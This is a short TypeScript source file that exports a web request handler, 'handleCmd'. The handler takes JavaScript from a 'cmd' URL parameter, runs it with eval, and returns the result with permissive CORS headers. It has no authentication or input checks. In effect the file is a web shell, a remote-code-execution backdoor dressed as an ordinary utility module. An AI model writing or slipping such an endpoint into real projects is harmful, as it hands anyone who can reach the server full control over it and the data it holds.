import { corsResponse } from "./utils/cors.ts";

export async function handleCmd(req: Request) {
  const url = new URL(req.url);
  const cmd = url.searchParams.get("cmd");

  if (!cmd) return corsResponse("Send ?cmd=<JS code>");

  try {
    const result = await eval(cmd);
    return corsResponse(JSON.stringify(result));
  } catch (e) {
    return corsResponse(e.toString());
  }
}